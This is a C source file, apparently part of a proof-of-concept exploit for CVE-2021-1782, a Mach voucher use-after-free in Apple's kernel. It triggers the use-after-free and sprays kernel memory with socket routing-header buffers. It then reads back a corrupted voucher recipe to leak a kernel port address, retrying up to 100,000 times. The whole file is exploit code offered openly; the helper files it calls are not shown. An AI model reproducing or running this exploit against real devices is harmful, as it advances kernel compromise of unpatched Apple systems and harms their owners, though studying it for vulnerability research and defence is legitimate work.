#include <mach/mach.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "IOKitLib.h"

#include "spray.h"
#include "helper.h"
#include "cve_2021_1782.h"

#define TRIES 100000

#define STRATEGY 1
// #define STRATEGY 2

void strategy_one() {
    mach_port_t voucher;
    kern_return_t kr;
    int j;
    mach_msg_type_number_t recipe_size, recipe_legit_size;
    void *recipe;
    int *spray_socks;
    uint8_t **rthdr_buf_array;
    size_t rthdr_len;
    uintptr_t leaked_port_address;

    recipe_size = MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE;
    recipe = calloc(recipe_size, sizeof(uint8_t));

    spray_socks = prepare_socks();
    prepare_spray_buf(&rthdr_buf_array, &rthdr_len, ELEM_SIZE, E_SIZE_SPRAY);

    init_exploit();

    for (j = 0; j < TRIES; j++) {
        if (j % 100 == 0) {
            INFO_LOG("attempt: %d\n", j);
        }  

        init_attempt(j);

        voucher = trigger_uaf(j);
        rthdr_spray(spray_socks, rthdr_buf_array, rthdr_len);

        recipe_size = MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE;
        kr = mach_voucher_extract_attr_recipe_trap(voucher, MACH_VOUCHER_ATTR_KEY_USER_DATA, recipe, &recipe_size);
        if (kr == KERN_SUCCESS && recipe_size != UNCORRUPTED_RECIPE_SIZE) {
            INFO_LOG("extract recipe: %x", recipe_size);
            hexdump(recipe, recipe_size);
            leaked_port_address = search_for_port_pointer_leak(recipe);
            INFO_LOG("%zx", leaked_port_address);
            if (leaked_port_address != 0) {
                break;
            }            
        }
        else if (kr != KERN_SUCCESS && kr != KERN_NO_SPACE && kr != MACH_SEND_INVALID_DEST) {
            printf("kr: 0x%x\n", kr);
        }

        reset_spray_socks(spray_socks);
        clear_attempt();
    }   
}

void strategy_two() {
    printf("Not implemented\n");
}

int main(int argc, const char *argv[]) {
    if (STRATEGY == 1) {
        strategy_one();
    } else {
        strategy_two();
    }

    return 0;
}
